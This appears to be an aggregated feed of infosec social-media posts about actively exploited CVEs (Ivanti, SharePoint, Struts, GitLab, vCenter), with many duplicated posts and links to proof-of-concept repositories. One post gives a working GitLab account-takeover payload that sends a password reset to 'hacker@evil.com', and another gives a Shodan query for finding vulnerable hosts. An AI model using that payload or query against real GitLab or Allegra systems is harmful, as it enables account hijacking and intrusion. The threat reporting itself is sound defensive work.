CISA Issues Emergency Directive on Ivanti Zero-Days https://www.securityweek.com/cisa-issues-emergency-directive-on-ivanti-zero-days/ #Malware&Threats #Vulnerabilities #CVE202346805 #CVE202421887 #Volexity #Ivanti #CISA

##
simontsui at 2024-01-19T18:33:09.934Z ##

CISA issues Emergency Directive 24-01: Mitigate Ivanti Connect Secure and Ivanti Policy Secure Vulnerabilities in response to CVE-2023-46805 (8.2 high, disclosed by Ivanti on 10 January 2024 as exploited zero-days) authentication bypass in Ivanti Connect Secure VPN Version 9.x and 22.x and CVE-2024-21887 (9.1 critical) command injection in Ivanti Connect Secure VPN Version 9.x and 22.x

ðŸ”— https://www.cisa.gov/news-events/directives/ed-24-01-mitigate-ivanti-connect-secure-and-ivanti-policy-secure-vulnerabilities

#Ivanti #ConnectSecure #vulnerability #zeroday #eitw #activeexploitation #UTA0178 #UNC5221 #CVE202346805 #CVE202421887

##
simontsui at 2024-01-19T15:56:27.654Z ##

Ron Bowes @iagox86 at @greynoise describes payloads leveraging the Ivanti Connect Secure vulnerabilities #CVE202346805 and #CVE202421887 to install cryptominers. IOC provided.
ðŸ”— https://www.greynoise.io/blog/ivanti-connect-secure-exploited-to-install-cryptominers

#threatintel #Ivanti #ConnectSecure #zeroday #vulnerability #eitw #IOC #KEV

##
simontsui at 2024-01-19T12:14:15.521Z ##

AssetNote documents the process they took in reverse engineering the Ivanti Connect Secure vulnerabilities CVE-2023-46805 (Authentication Bypass) & CVE-2024-21887 (Remote Command Execution), as well as understanding potential gaps in other detection mechanisms and exploit payloads that were published. They gave a shoutout to Ron Bowes @iagox86 at @greynoise
ðŸ”— https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce

#AssetNote #Ivanti #ConnectSecure #zeroday #CVE202346805 #CVE202421887 #eitw #KEV #KnownExploitedVulnerabilitiesCatalog #activeexploitation

##
H3liumb0y at 2024-01-16T08:25:06.984Z ##

"ðŸš¨ Ivanti VPN Zero-Day Exploits Unleash Global Cyber Onslaught ðŸš¨"

ðŸ”’ Two zero-day vulnerabilities in Ivanti's Connect Secure VPN and Policy Secure network access control (NAC) appliances are facing mass exploitation. Discovered by Volexity, the CVE-2023-46805 and CVE-2024-21887 vulnerabilities enable widespread attacks, impacting businesses of all sizes worldwide, including Fortune 500 companies. The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

Stay vigilant and prioritize immediate protective actions!

ðŸ”— Source: BleepingComputer - Sergiu Gatlan

Tags: #CyberSecurity #ZeroDay #IvantiVPN #CVE202346805 #CVE202421887 #APT #UTA0178 #UNC5221 #Malware #Webshell #Volexity #Mandiant #NetworkSecurity #InfoSecðŸ›¡ï¸ðŸŒðŸ‘¾

##
simontsui at 2024-01-16T01:17:49.542Z ##

Volexity reports the following about CVE-2023-46805 and CVE-2024-21887:

  • Exploitation of these vulnerabilities is now widespread. Volexity has been able to find evidence of compromise of over 1,700 devices worldwide.
  • Additional threat actors beyond UTA0178 appear to now have access to the exploit and are actively trying to exploit devices.

ðŸ”— https://www.volexity.com/blog/2024/01/15/ivanti-connect-secure-vpn-exploitation-goes-global/

#Ivanti #zeroday #eitw #vulnerability #CVE202346805 #CVE202421887 #KEV

ðŸ”— https://www.cisa.gov/news-events/directives/ed-24-01-mitigate-ivanti-connect-secure-and-ivanti-policy-secure-vulnerabilities

"ðŸš¨ Ivanti VPN Zero-Day Exploits Unleash Global Cyber Onslaught ðŸš¨"

ðŸ”’ Two zero-day vulnerabilities in Ivanti's Connect Secure VPN and Policy Secure network access control (NAC) appliances are facing mass exploitation. Discovered by Volexity, the CVE-2023-46805 and CVE-2024-21887 vulnerabilities enable widespread attacks, impacting businesses of all sizes worldwide, including Fortune 500 companies. The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

Stay vigilant and prioritize immediate protective actions!

"ðŸš¨ Ivanti VPN Zero-Day Exploits Unleash Global Cyber Onslaught ðŸš¨"

ðŸ”’ Two zero-day vulnerabilities in Ivanti's Connect Secure VPN and Policy Secure network access control (NAC) appliances are facing mass exploitation. Discovered by Volexity, the CVE-2023-46805 and CVE-2024-21887 vulnerabilities enable widespread attacks, impacting businesses of all sizes worldwide, including Fortune 500 companies. The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

Stay vigilant and prioritize immediate protective actions!

##
campuscodi@mastodon.social at 2024-01-21T00:58:04.000Z ##

Security researchers from Assetnote have found new ways to exploit the recent Ivanti zero-days (CVE-2023-46805 & CVE-2024-21887) on older versions of the Connect Secure firmware.

https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce

According to GreyNoise, exploitation of these zero-days has extended from a Chinese APT to cryptomining botnets.

https://www.greynoise.io/blog/ivanti-connect-secure-exploited-to-install-cryptominers

simontsui at 2024-01-12T13:21:31.769Z ##

Mandiant published their own blog post regarding the active exploitation of Ivanti zero-days CVE-2023-46805 and CVE-2024-21887. They track the threat actor UTA0178 (Volexity's) as UNC5221, described as a suspected APT. They describe post-exploitation activity and identify custom malware. IOC and Yara rules provided.

##
simontsui at 2024-01-10T18:14:42.257Z ##

Ivanti zero-days: Ivanti Connect Secure (ICS), formerly known as Pulse Connect Secure and Ivanti Policy Secure gateways. "If CVE-2024-21887 is used in conjunction with CVE-2023-46805, exploitation does not require authentication and enables a threat actor to craft malicious requests and execute arbitrary commands on the system."

  • CVE-2023-46805 (8.2 high) authentication bypass
  • CVE-2024-21887 (9.1 critical) command injection

ðŸ”—

  • security advisory: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
  • blog post: https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways
  • knowledge base article: https://forums.ivanti.com/s/article/KB-CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

People are calling them exploited zero-days. There is no patch available at this time: https://cyberplace.social/@GossiTheDog/111732557100241084

EDIT: Are you aware of any active exploitation of the vulnerability?
We are aware of less than 10 customers impacted by the vulnerabilities. We are unable to discuss the specifics of our customers.

simontsui@infosec.exchange at 2024-01-10T18:14:42.000Z ##

Ivanti zero-days: Ivanti Connect Secure (ICS), formerly known as Pulse Connect Secure and Ivanti Policy Secure gateways. "If CVE-2024-21887 is used in conjunction with CVE-2023-46805, exploitation does not require authentication and enables a threat actor to craft malicious requests and execute arbitrary commands on the system."

  • CVE-2023-46805 (8.2 high) authentication bypass
  • CVE-2024-21887 (9.1 critical) command injection

ðŸ”—

  • security advisory: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
  • blog post: https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways
  • knowledge base article: https://forums.ivanti.com/s/article/KB-CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

People are calling them exploited zero-days. There is no patch available at this time: https://cyberplace.social/@GossiTheDog/111732557100241084

EDIT: Are you aware of any active exploitation of the vulnerability?
We are aware of less than 10 customers impacted by the vulnerabilities. We are unable to discuss the specifics of our customers.

  • CVE-2023-39143 (9.8 critical, disclosed 25 July 2023 by PaperCut) path traversal in PaperCut NG/MF before 22.1.3 allowing for arbitrary file upload/read/delete and RCE
  • CVE-2023-43208 (9.8 critical, disclosed 25 October 2023 by Horizon3) unauthenticated RCE in NextGenâ€™s Mirth Connect

##

CVE-2018-15133
(8.1 HIGH)

EPSS: 62.42%

12 posts

In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in `Illuminate/Encryption/Encrypter.php` and PendingBroadcast in `gadgetchains/Laravel/RCE/3/chain.php` in phpggc. The attacker must know the application key, which normally would never occ

11 repos

https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader

https://github.com/AlienX2001/better-poc-for-CVE-2018-15133

https://github.com/kozmic/laravel-poc-CVE-2018-15133

https://github.com/pwnedshell/Larascript

https://github.com/0xSalle/cve-2018-15133

https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot

https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133

https://github.com/Bilelxdz/Laravel-CVE-2018-15133

https://github.com/aljavier/exploit_laravel_cve-2018-15133

https://github.com/AzhariKun/CVE-2018-15133

https://github.com/bukitbarisan/laravel-rce-cve-2018-15133

H3liumb0y at 2024-01-18T10:13:54.148Z ##

"âš ï¸ Alert: Androxgh0st Botnet Targets AWS & Microsoft Credentials! ðŸš¨"

The cybersecurity realm is on high alert with the emergence of Androxgh0st, a botnet malware exploiting vulnerabilities to steal AWS and Microsoft credentials. It's a Python-scripted threat, targeting sensitive .env files and leveraging SMTP for credential scanning and web shell deployment. Key vulnerabilities exploited include CVE-2017-9841, CVE-2018-15133, and CVE-2021-41773, allowing remote code execution and file uploads. This critical development warrants immediate attention and proactive defense strategies.

Tags: #CyberSecurity #Botnet #Androxgh0st #Vulnerability #AWS #Microsoft #SMTP #PHP #CVE20179841 #CVE201815133 #CVE202141773 #RemoteCodeExecution #CyberAttack

Sources:

  • "Androxgh0st Botnet Malware Steals AWS, Microsoft Credentials" by Tushar Subhra Dutta on GBHackers. https://gbhackers.com/androxgh0st-botnet-malware/
  • "US Gov Issues Warning for Androxgh0st Malware Attacks" by Ionut Arghire on SecurityWeek. https://www.securityweek.com/us-gov-issues-warning-for-androxgh0st-malware-attacks/

Mitre - CVE-2017-9841
Mitre - CVE-2018-15133
Mitre - CVE-2021-41773

##
simontsui at 2024-01-16T17:14:18.401Z ##

Vulnerabilities mentioned in this CISA cybersecurity advisory:

  • CVE-2017-9841 (9.8 critical, disclosed 27 June 2017, added to CISA KEV Catalog 15 February 2022) arbitrary PHP code execution in PHPUnit
  • CVE-2018-15133 (8.1 high, disclosed 09 August 2018, added to KEV 16 January 2024) Laravel Deserialization of Untrusted Data Vulnerability (RCE)
  • CVE-2021-41773 (7.5 high, disclosed 05 October 2021, added to KEV 03 November 2021) Apache HTTP Server Path Traversal Vulnerability (RCE)

#CVE201815133 #KEV #vulnerability #CVE20179841 #CVE202141773 #eitw #activeexploitation

##

ðŸ”— https://www.cisa.gov/news-events/alerts/2024/01/16/cisa-adds-one-known-exploited-vulnerability-catalog

CVE-2023-29357
(9.8 CRITICAL)

EPSS: 10.70%

15 posts

Microsoft SharePoint Server Elevation of Privilege Vulnerability

5 repos

jos1264@social.skynetcloud.site at 2024-01-15T11:20:02.000Z ##

ExplotaciÃ³n activa de vulnerabilidad Microsoft SharePoint Server CVE-2023-29357 https://blog.elhacker.net/2024/01/explotacion-activa-vulnerabilidad-microsoft-sharepoint.html #estadosunidos #sharepoint #microsoft #CISA

##
jbhall56 at 2024-01-13T16:42:54.620Z ##

Tracked as CVE-2023-29357, the security flaw enables remote attackers to get admin privileges on unpatched servers by circumventing authentication using spoofed JWT auth tokens. https://www.bleepingcomputer.com/news/security/cisa-critical-microsoft-sharepoint-bug-now-actively-exploited/#google_vignette

##
LMGsecurity at 2024-01-11T18:39:04.279Z ##

CISA adds critical #SharePoint vuln CVE-2023-29357 to its Known Exploited Vulnerabilities catalog & suggests immediate patching. A patch is available, but CISA's move likely indicates the vulnerability is being actively exploited. https://www.securityweek.com/cisa-urges-patching-of-exploited-sharepoint-server-vulnerability/
#cybersecurity #DFIR

##
campuscodi@mastodon.social at 2024-01-11T18:02:43.000Z ##

CISA says that threat actors are exploiting a vulnerability in Microsoft SharePoint servers.

Tracked as CVE-2023-29357, the bug was patched in June of last year.

The vulnerability is an elevation of privilege that can be chained with other SharePoint bugs to achieve remote code execution attacks.

Loads of technical write-ups and public PoCs on how to perform such attacks have been available online since September of last year.

https://www.cisa.gov/news-events/alerts/2024/01/10/cisa-adds-one-known-exploited-vulnerability-catalog

##
simontsui at 2024-01-11T17:01:46.667Z ##

@GossiTheDog @nopatience For recordkeeping purposes, can you identify which ransomware group is using CVE-2023-29357 and if there's an available source?

##
nopatience@swecyb.com at 2024-01-11T15:36:11.000Z ##

A vulnerability in Microsoft Sharepoint, originally patched back in September (CVE-2023-29357) have since yesterday appeared in CISA KEV meaning there's known exploitation of said vulnerability.

@GossiTheDog called this out already back in September, but not sure if we ever saw the predicted ransomware attacks.

https://www.cisa.gov/known-exploited-vulnerabilities-catalog

#Microsoft #SharePoint #Vulnerability #ThreatIntel

##
jbhall56 at 2024-01-11T13:21:06.993Z ##

The security defect, tracked as CVE-2023-29357 (CVSS score of 9.8) and patched on June 2023 Patch Tuesday, is described as an elevation of privilege (EoP) flaw that allows unauthenticated attackers to gain administrator privileges. https://www.securityweek.com/cisa-urges-patching-of-exploited-sharepoint-server-vulnerability/

##
jbhall56@infosec.exchange at 2024-01-11T13:21:06.000Z ##

The security defect, tracked as CVE-2023-29357 (CVSS score of 9.8) and patched on June 2023 Patch Tuesday, is described as an elevation of privilege (EoP) flaw that allows unauthenticated attackers to gain administrator privileges. https://www.securityweek.com/cisa-urges-patching-of-exploited-sharepoint-server-vulnerability/

##
simontsui@infosec.exchange at 2024-01-10T16:40:17.000Z ##

CISA adds one to the Known Exploited Vulnerabilities (KEV) Catalog:
CVE-2023-29357 (9.8 critical, disclosed 13 June 2023 on Patch Tuesday) Microsoft SharePoint Server Privilege Escalation Vulnerability
ðŸ”— https://www.cisa.gov/news-events/alerts/2024/01/10/cisa-adds-one-known-exploited-vulnerability-catalog

##

CVE-2023-50164
(9.8 CRITICAL)

EPSS: 9.72%

8 posts

An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. Users are recommended to upgrade to versions Struts 2.5.33 orÂ Struts 6.3.0.2 or greater toÂ fix this issue.

10 repos

https://github.com/Thirukrishnan/CVE-2023-50164-Apache-Struts-RCE

https://github.com/aaronm-sysdig/cve-2023-50164

https://github.com/dwisiswant0/cve-2023-50164-poc

https://github.com/snyk-labs/CVE-2023-50164-POC

https://github.com/miles3719/cve-2023-50164

https://github.com/Trackflaw/CVE-2023-50164-ApacheStruts2-Docker

https://github.com/bcdannyboy/CVE-2023-50164

https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE

https://github.com/helsecert/cve-2023-50164

https://github.com/sunnyvale-it/CVE-2023-50164-PoC

simontsui at 2024-01-17T16:34:13.910Z ##

@GossiTheDog Didn't Cisco announce that their Identity Services Engine (ISE) was vulnerable to CVE-2023-50164 on December 12th? https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-struts-C2kCMkmT

And Oracle pushed patches for CVE-2023-50164 affecting Communication Policy Management, Hyperion Infrastructure Technology and MySQL Enterprise Monitor yesterday: https://www.oracle.com/security-alerts/cpujan2024.html

##
GossiTheDog@cyberplace.social at 2024-01-17T16:22:46.000Z ##

We have the first vendor product actually vulnerable to that Apache Struts vuln from December 2023 - CVE-2023-50164.

Product: Trackplus Allegra
Tailored POC: https://srcincite.io/pocs/src-2024-0001.py.txt
Advisory: https://srcincite.io/advisories/src-2024-0001/

Complete with ../.. directory traversal too.

Disclosure Timeline:

2023-11-08 â€“ Vulnerability reported to security@struts.apache.org

2023-12-21 â€“ Silently patched by the vendor

Shodan search: title:"Allegra" html:"trackplus"

##
simontsui at 2024-01-17T12:57:57.262Z ##

Oracle confirms that the Apache Struts 2 RCE vulnerability CVE-2023-50164 affects three products and provided patches against these vulnerable versions:

  • Oracle Communications Policy Management 12.6.1.0.0, 15.0.0.0.0
  • Oracle Hyperion Infrastructure Technology 11.2.14.0.000
  • Oracle MySQL Enterprise Monitor 8.0.36 and prior

ðŸ”— https://www.oracle.com/security-alerts/cpujan2024.html

#Apache #Struts2 #CVE202350164 #OracleCriticalPatchUpdate

##
GossiTheDog@cyberplace.social at 2024-01-12T23:13:05.000Z ##

Finally had a single honeypot hit for CVE-2023-50164 on Greynoise.

It the record I havenâ€™t heard of a single org having an incident with this vuln, before anybody gets too excited.

##

CVE-2022-41328
(7.1 HIGH)

EPSS: 5.86%

4 posts

A improper limitation of a pathname to a restricted directory vulnerability ('path traversal') [CWE-22] in Fortinet FortiOS version 7.2.0 through 7.2.3, 7.0.0 through 7.0.9 and before 6.4.11 allows a privileged attacker to read and write files on the underlying Linux system via crafted CLI commands.

simontsui at 2024-01-19T17:33:52.738Z ##

UNC3886 is a Chinese state-sponsored cyberespionage group that has targeted and exploited zero-day vulnerabilities in firewall and virtualization technologies, which do not support EDR solutions. UNC3886 has primarily targeted defense, technology, and telecommunication organizations located in the US and APJ regions. First public reporting on UNC3886 exploitation came from Mandiant on 29 September 2022.

UNC886 has been known to leverage the following vulnerabilities:

  • CVE-2022-41328 (7.1 high, disclosed 07 March 2023, in KEV) Fortinet FortiOS local directory traversal leads to arbitrary read/write
  • CVE-2023-20867 (3.9 low, disclosed 13 June 2023 by VMware, in KEV, VMware Tools Authentication Bypass)
  • CVE-2023-34048 (9.8 critical, disclosed 25 Octover 2023, under active exploitation, VMware vCenter Server Out-of-Bounds Write Vulnerability to RCE)

#UNC3886 #CVE202241328 #CVE202320867 #CVE202334048 #VMware #vCenter #RCE #FortiOS #KEV #China #cyberespionage #VMwaretools #APT

##
simontsui@infosec.exchange at 2024-01-19T17:33:52.000Z ##

UNC3886 is a Chinese state-sponsored cyberespionage group that has targeted and exploited zero-day vulnerabilities in firewall and virtualization technologies, which do not support EDR solutions. UNC3886 has primarily targeted defense, technology, and telecommunication organizations located in the US and APJ regions. First public reporting on UNC3886 exploitation came from Mandiant on 29 September 2022.

UNC886 has been known to leverage the following vulnerabilities:

  • CVE-2022-41328 (7.1 high, disclosed 07 March 2023, in KEV) Fortinet FortiOS local directory traversal leads to arbitrary read/write
  • CVE-2023-20867 (3.9 low, disclosed 13 June 2023 by VMware, in KEV, VMware Tools Authentication Bypass)
  • CVE-2023-34048 (9.8 critical, disclosed 25 Octover 2023, under active exploitation, VMware vCenter Server Out-of-Bounds Write Vulnerability to RCE)

##

CVE-2023-7028
(10.0 CRITICAL)

EPSS: 3.35%

17 posts

An issue has been discovered in GitLab CE/EE affecting all versions from 16.1 prior to 16.1.6, 16.2 prior to 16.2.9, 16.3 prior to 16.3.7, 16.4 prior to 16.4.5, 16.5 prior to 16.5.6, 16.6 prior to 16.6.4, and 16.7 prior to 16.7.2 in which user account password reset emails could be delivered to an unverified email address.

##
snafu@digitalcourage.social at 2024-01-15T22:40:45.000Z ##

So, in case anyone still thinks that patching and security in general is not so important nowadays: Found already several tries of exploiting the recent critical CVE-2023-7028 vulnerability in the logs of my GitLab instance although it was only published a few days ago.

Conclusion:
âœ… Install security updates *literally* ASAP.
âœ… Turn on mandatory 2FA for all users.

#GitLab #CVE #2FA #Security #Hacker #Update

##
raptor at 2024-01-13T16:13:18.454Z ##

#PoC for #gitlab CVE-2023-7028

https://github.com/Vozec/CVE-2023-7028

Simple payload:
user[email][]=my.target@example.com&user[email][]=hacker@evil.com

ðŸ¤¦ ðŸ¤¦â€â™€ï¸ ðŸ¤¦â€â™‚ï¸

##
h4sh at 2024-01-13T08:47:34.896Z ##

#GitLab #cve unauthenticated password reset account takeover (CVSS 10.0) CVE-2023-7028

Very simple to exploit, attacker can receive the password reset email for any known user with any email address.

PoC is public and available. Please patch ASAP. You are not affected if you've enforced MFA for all users (as they will be able to reset password but can't login).

#Nuclei template here waiting to merge: https://github.com/projectdiscovery/nuclei-templates/pull/8934

##
harrysintonen at 2024-01-12T19:39:40.436Z ##

The #GitLab #vulnerability allowing trivial account hijacking (CVE-2023-7028) will lead to ton of problems: It will allow malicious actors to perform #supplychain #attacks - something that will allow attacker to gain access to 3rd party who don't themselves run GitLab but just include from projects that do. I would suggest great caution regardless if you run GitLab yourself or not.

Naturally anyone using GitLab themselves must update as soon as possible. I would also suggest performing forensic investigation to find out if you have already been compromised, and take further action in case compromise has already occurred. Check "Were any accounts actually compromised due to this vulnerability?" section in this post for details: https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/

##
zeljkazorz at 2024-01-12T11:11:25.546Z ##

A critical vulnerability in GitLab CE/EE (CVE-2023-7028) can be easily exploited by attackers to reset GitLab user account passwords.

https://www.helpnetsecurity.com/2024/01/12/cve-2023-7028/

#GitLab #DevOps #SecurityUpdate #Cybersecurity

##
jos1264@social.skynetcloud.site at 2024-01-12T11:10:05.000Z ##

Critical GitLab flaw allows account takeover without user interaction, patch quickly! (CVE-2023-7028) https://www.helpnetsecurity.com/2024/01/12/cve-2023-7028/ #accounthijacking #securityupdate #vulnerability #Don'tmiss #Hotstuff #GitLab #News

##
jomo@mstdn.io at 2024-01-12T00:15:03.000Z ##

PSA: Update your GitLab instances to version 16.7.2, 16.6.4, or 16.5.6!

Critical (CVSS 10/10) vulnerability allows account takeover without user interaction via password reset. CVE-2023-7028

There are some other critical/high vulns as well:

https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/#account-takeover-via-password-reset-without-user-interactions

#gitlab #infosec #security #CVE_2023_7028

##

CVE-2018-10088
(9.8 CRITICAL)

EPSS: 2.61%

4 posts

Buffer overflow in XiongMai uc-httpd 1.0.0 has unspecified impact and attack vectors, a different vulnerability than CVE-2017-16725.

simontsui at 2024-01-18T15:13:57.426Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

#7777Botnet #botnet #TPLink #Xiongmai #Hikvision #CVE202177577 #CVE201810088 #CVE202245460 #CVE202136260 #CVE202224355 #MVPower #Zyxel #GitLab

##
simontsui@infosec.exchange at 2024-01-18T15:13:57.000Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

#7777Botnet #botnet #TPLink #Xiongmai #Hikvision #CVE202177577 #CVE201810088 #CVE202245460 #CVE202136260 #CVE202224355 #MVPower #Zyxel #GitLab

##
simontsui at 2024-01-18T15:13:57.426Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

#7777Botnet #botnet #TPLink #Xiongmai #Hikvision #CVE202177577 #CVE201810088 #CVE202245460 #CVE202136260 #CVE202224355 #MVPower #Zyxel #GitLab

##
simontsui@infosec.exchange at 2024-01-18T15:13:57.000Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

##

CVE-2023-34048
(9.8 CRITICAL)

EPSS: 1.72%

21 posts

vCenter Server contains an out-of-bounds write vulnerability in the implementation of the DCERPC protocol.Â A malicious actor with network access to vCenter Server may trigger an out-of-bounds write potentially leading to remote code execution.

simontsui at 2024-01-22T15:13:57.111Z ##

CISA adds CVE-2023-34048 (9.8 critical, disclosed 25 October 2023 by VMware, reported by Mandiant as exploited as a zero-day since 2021) VMware vCenter Server Out-of-Bounds Write Vulnerability to the Known Exploited Vulnerabilities (KEV) Catalog.
ðŸ”— https://www.cisa.gov/news-events/alerts/2024/01/22/cisa-adds-one-known-exploited-vulnerability-catalog

#CVE202334048 #VMware #CISA #KEV #eitw #activeexploitation #Mandiant #UNC3886 #cyberespionage #vCenter #zeroday #vulnerability #cybersecurity

##
Walker at 2024-01-22T14:35:20.493Z ##

Once again Atlassian is keeping incident responders busy.

#Atlassian #Confluence #RCE #vulnerability #activeexploitation #eitw #CVE202334048 #CVE202322527 #incidentresponse

##
simontsui at 2024-01-19T17:33:52.738Z ##

UNC3886 is a Chinese state-sponsored cyberespionage group that has targeted and exploited zero-day vulnerabilities in firewall and virtualization technologies, which do not support EDR solutions. UNC3886 has primarily targeted defense, technology, and telecommunication organizations located in the US and APJ regions. First public reporting on UNC3886 exploitation came from Mandiant on 29 September 2022.

UNC886 has been known to leverage the following vulnerabilities:

  • CVE-2022-41328 (7.1 high, disclosed 07 March 2023, in KEV) Fortinet FortiOS local directory traversal leads to arbitrary read/write
  • CVE-2023-20867 (3.9 low, disclosed 13 June 2023 by VMware, in KEV, VMware Tools Authentication Bypass)
  • CVE-2023-34048 (9.8 critical, disclosed 25 Octover 2023, under active exploitation, VMware vCenter Server Out-of-Bounds Write Vulnerability to RCE)

#UNC3886 #CVE202241328 #CVE202320867 #CVE202334048 #VMware #vCenter #RCE #FortiOS #KEV #China #cyberespionage #VMwaretools #APT

##
simontsui at 2024-01-19T16:37:43.513Z ##

HOT OFF THE PRESS: Mandiant reports that Chinese Espionage Group UNC3886 was found exploiting VMware vCenter RCE vulnerability CVE-2023-34048 as a Zero-Day since late 2021!
ðŸ”— https://www.mandiant.com/resources/blog/chinese-vmware-exploitation-since-2021

#Mandiant #UNC3886 #VMware #vCenter #CVE202334048 #zeroday #eitw #activeexploitation

##
simontsui at 2024-01-19T16:01:42.929Z ##

ðŸ”— https://www.rapid7.com/blog/post/2024/01/19/etr-critical-cves-in-outdated-versions-of-atlassian-confluence-and-vmware-vcenter-server/

simontsui@infosec.exchange at 2024-01-19T17:33:52.000Z ##

UNC3886 is a Chinese state-sponsored cyberespionage group that has targeted and exploited zero-day vulnerabilities in firewall and virtualization technologies, which do not support EDR solutions. UNC3886 has primarily targeted defense, technology, and telecommunication organizations located in the US and APJ regions. First public reporting on UNC3886 exploitation came from Mandiant on 29 September 2022.

UNC886 has been known to leverage the following vulnerabilities:

  • CVE-2022-41328 (7.1 high, disclosed 07 March 2023, in KEV) Fortinet FortiOS local directory traversal leads to arbitrary read/write
  • CVE-2023-20867 (3.9 low, disclosed 13 June 2023 by VMware, in KEV, VMware Tools Authentication Bypass)
  • CVE-2023-34048 (9.8 critical, disclosed 25 Octover 2023, under active exploitation, VMware vCenter Server Out-of-Bounds Write Vulnerability to RCE)

CVE-2017-2619
(7.5 HIGH)

EPSS: 1.66%

2 posts

Samba before versions 4.6.1, 4.5.7 and 4.4.11 are vulnerable to a malicious client using a symlink race to allow access to areas of the server file system not exported under the share definition.

jokeyrhyme@aus.social at 2024-01-10T23:31:22.000Z ##

@nzakas true

And it's still possible to have such TOCTOU races lurking elsewhere in a filesystem API, so it's probably not specific to predicates: https://blog.rust-lang.org/2022/01/20/cve-2022-21658.html

And races pop up in any software that has to perform filesystem operations:
